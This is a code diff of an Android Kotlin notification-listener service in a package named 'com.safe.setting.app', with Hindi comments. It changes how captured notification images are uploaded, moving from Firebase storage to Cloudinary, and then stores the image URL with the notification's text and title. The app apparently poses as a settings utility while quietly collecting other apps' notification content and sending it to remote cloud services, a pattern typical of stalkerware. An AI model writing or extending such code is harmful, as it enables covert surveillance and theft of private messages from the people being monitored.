@@ -2,8 +2,9 @@ package com.safe.setting.app.services.notificationService
 
 import android.content.Context
 import android.graphics.Bitmap
-import android.net.Uri
+import android.os.Build
 import android.util.Log
+import androidx.annotation.RequiresApi
 import com.safe.setting.app.data.model.NotificationMessages
 import com.safe.setting.app.data.rxFirebase.InterfaceFirebase
 import com.safe.setting.app.utils.ConstFun.getDateTime
@@ -13,11 +14,11 @@ import com.safe.setting.app.utils.Consts.DATA
 import com.safe.setting.app.utils.Consts.NOTIFICATION_MESSAGE
 import com.safe.setting.app.utils.FileHelper
 import com.safe.setting.app.utils.FileHelper.getFileNameBitmap
-// import com.pawegio.kandroid.e // **** पुराना इम्पोर्ट हटा दिया गया ****
+import com.safe.setting.app.utils.CloudinaryManager
 import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers
 import io.reactivex.rxjava3.disposables.CompositeDisposable
 import io.reactivex.rxjava3.schedulers.Schedulers
-import java.io.File
+import java.io.File // 1. java.io.File को इम्पोर्ट करें
 import javax.inject.Inject
 
 class InteractorNotificationService @Inject constructor(private val context: Context, private val firebase: InterfaceFirebase) : InterfaceNotificationListener {
@@ -34,32 +35,34 @@ class InteractorNotificationService @Inject constructor(private val context: Con
                 .map { value -> value.exists() }
                 .subscribeOn(Schedulers.io())
                 .observeOn(AndroidSchedulers.mainThread())
-                // **** बदला हुआ कोड: kandroid.e को Log.e से बदलें ****
                 .subscribe({ if (!it) exec() },{ Log.e(Consts.TAG,it.message.toString()) }))
-            // **** बदलाव समाप्त ****
         }
     }
 
-    override fun setDataMessageNotification(type: Int, text: String?, title: String?,nameImage: String?,image:Bitmap?) {
-        if (image!=null){
-            val imageFile = image.getFileNameBitmap(context,nameImage!!)
-            val uri = Uri.fromFile(File(imageFile))
-            disposable.add(firebase.putFile("$NOTIFICATION_MESSAGE/$nameImage",uri)
+    @RequiresApi(Build.VERSION_CODES.O)
+    override fun setDataMessageNotification(type: Int, text: String?, title: String?, nameImage: String?, image:Bitmap?) {
+        if (image!=null && nameImage != null){
+            // 2. getFileNameBitmap अब फाइल का पथ (String) लौटाएगा
+            val imageFilePath = image.getFileNameBitmap(context,nameImage)
+            // 3. हम उस पथ से एक File ऑब्जेक्ट बनाएंगे
+            val imageFile = File(imageFilePath)
+
+            disposable.add(CloudinaryManager.uploadPhoto(imageFile) // अब यह सही से काम करेगा
                 .subscribeOn(Schedulers.io())
                 .observeOn(AndroidSchedulers.mainThread())
-                .subscribe({ task ->
-                    task.storage.downloadUrl.addOnCompleteListener {
-                        setData(type,text,title,nameImage,it.result.toString())
-                        FileHelper.deleteFile(imageFile)
-                    }
+                .subscribe({ url ->
+                    // Cloudinary से URL मिलने के बाद डेटा सहेजें
+                    setData(type,text,title,nameImage,url)
+                    FileHelper.deleteFile(imageFilePath) // पथ का उपयोग करके फाइल डिलीट करें
                 }, { error ->
-                    // **** बदला हुआ कोड: kandroid.e को Log.e से बदलें ****
-                    Log.e(Consts.TAG, error.message.toString())
-                    // **** बदलाव समाप्त ****
-                    FileHelper.deleteFile(imageFile)
-                }))
+                    Log.e(Consts.TAG, "Cloudinary Upload Error: ${error.message}")
+                    FileHelper.deleteFile(imageFilePath) // पथ का उपयोग करके फाइल डिलीट करें
+                })
+            )
 
-        }else setData(type,text,title,"-","-")
+        } else {
+            setData(type,text,title,"-","-")
+        }
     }
 
     private fun setData(type: Int, text: String?, title: String?,nameImage:String?,urlImage:String?){
